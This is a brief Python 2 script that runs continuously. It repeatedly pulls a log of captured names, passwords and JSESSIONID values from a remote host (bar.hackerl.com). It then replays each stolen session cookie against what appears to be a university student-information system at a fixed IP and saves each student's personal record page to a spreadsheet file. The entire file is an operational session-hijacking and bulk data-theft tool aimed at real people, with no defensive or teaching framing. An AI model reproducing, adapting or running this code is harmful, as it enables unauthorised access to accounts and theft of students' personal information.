import cookielib
import urllib2
import os
import time
while(True):
    f = urllib2.urlopen('http://bar.hackerl.com/download?filename=/root/blog/NCU.txt') 
    datas = f.read() 
    with open("NCU.txt", "wb") as NCU:     
        NCU.write(datas)
    NCU.close()

    lines = open('NCU.txt').readlines()
    for s in lines[::-1]:
        name=s.split('ame=')[1].split(' password')[0]+".xls"
        if not os.path.exists(name):
            print 'start download '+name
            g=open('cookie','w')
            g.write("# Netscape HTTP Cookie File\n218.64.56.18	FALSE	/	FALSE		JSESSIONID	"+s.split('JSESSIONID=')[1]+"\n")
            g.close()
            cookie = cookielib.MozillaCookieJar()
            cookie.load('cookie', ignore_discard=True, ignore_expires=True)
            req = urllib2.Request("http://218.64.56.18/jsxsd/grxx/xsxx_print.do")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
            response = opener.open(req)
            data =response.read()
            with open(name, "wb") as code:     
                code.write(data) 
    print 'sleep 10s' 
    time.sleep(10)
